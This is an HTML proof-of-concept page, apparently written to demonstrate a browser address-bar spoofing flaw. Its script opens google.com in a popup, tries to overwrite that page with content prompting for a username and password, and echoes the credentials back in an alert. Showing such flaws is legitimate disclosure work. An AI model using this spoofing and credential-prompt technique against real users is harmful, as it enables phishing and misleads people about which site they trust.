<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Browser Security Demo</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;}

html,body{
width:100%;
height:100%;
font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
}

body{
display:flex;
justify-content:center;
align-items:center;
flex-direction:column;
gap:30px;
padding:20px;
}

.container{
background:white;
padding:40px;
border-radius:12px;
box-shadow:0 10px 40px rgba(0,0,0,0.3);
max-width:600px;
text-align:center;
}

h1{color:#333;margin-bottom:20px;font-size:28px;}

.demo-button{
padding:15px 30px;
font-size:18px;
border-radius:8px;
background-color:#667eea;
color:white;
border:none;
cursor:pointer;
box-shadow:0 4px 15px rgba(102,126,234,0.4);
}

.flag-hunt{
background:#f0f0f0;
padding:20px;
border-radius:8px;
margin-top:20px;
font-family:monospace;
}
</style>
</head>

<body>

<div class="container">
<h1>🔒 Browser Security Demonstration</h1>

<button class="demo-button" onclick="safeDemo()">POC</button>

<div class="flag-hunt">
<strong>Browser Blank Address Bar Lead Spoof</strong>
</div>

</div>

<script>

function addMetaRefresh() {
  var meta = document.createElement("meta");
  meta.httpEquiv = "refresh";
  meta.content = "0;url=https://example.com";
  document.head.appendChild(meta);
}

function safeDemo() {

  // meta refresh on main page
  addMetaRefresh();

  // open popup
  let win = window.open("https://www.google.com/", "_blank");

  setTimeout(() => {

    try {

      win.document.write(`
<h1>This is not Google!</h1>

<button onclick="
let username = prompt('Enter your username');
let password = prompt('Enter your password');
alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
">
Click me
</button>

`);

      win.document.close();

      console.log("Content injection succeeded");

    } catch (e) {

      console.warn("Blocked by browser protections:", e);
      alert("Browser security blocked the injection");

    }

  },50);

}

</script>

</body>
</html>
